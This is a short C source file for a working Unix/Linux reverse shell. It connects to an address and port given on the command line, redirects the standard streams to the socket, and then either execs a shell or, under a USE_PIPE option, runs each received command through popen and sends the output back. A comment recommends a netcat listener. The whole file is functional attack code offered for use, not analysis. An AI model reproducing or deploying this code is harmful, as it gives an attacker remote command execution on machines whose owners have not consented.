// unix/linux reverse shell (to listen at the other end you can use `nc -l`)
// (on android execv might not work, so define USE_PIPE for a lame alternative)

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <string.h>

int main(int argc, char *argv[])
{
	if (argc < 4)
	{
		printf("./0 <shell> <addr> <port>\n");
		return 1;
	}

	struct sockaddr_in sa = {0};
	int sd;

	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr(argv[2]);
	sa.sin_port = htons(atoi(argv[3]));

	if ((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		perror("socket");
		return 1;
	}

	if (connect(sd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
	{
		close(sd);
		perror("connect");
		return 1;
	}

	dup2(sd, 0);
	dup2(sd, 1);
	dup2(sd, 2);

#ifdef USE_PIPE
	while (1)
	{
		char buf[8192] = { 0 };
		char bufsh[8192] = { 0 };

		ssize_t rc;
		if ((rc = read(sd, buf, sizeof(buf)-1)) < 0)
		{
			perror("read");
			return 1;
		}

		FILE * shp;
		if ((shp = popen(buf, "r")) == NULL)
		{
			close(sd);
			perror("popen"); // might fail: 'The popen() function does not reliably set errno.' ((3) popen)
			return 1;
		}

		while (fgets(bufsh, sizeof(bufsh)-1, shp) != NULL)
		{
			write(sd, bufsh, strlen(bufsh));
		}

		pclose(shp);
	}
#else
	execv(argv[1], NULL);
#endif

	close(sd);

	return 0;
}

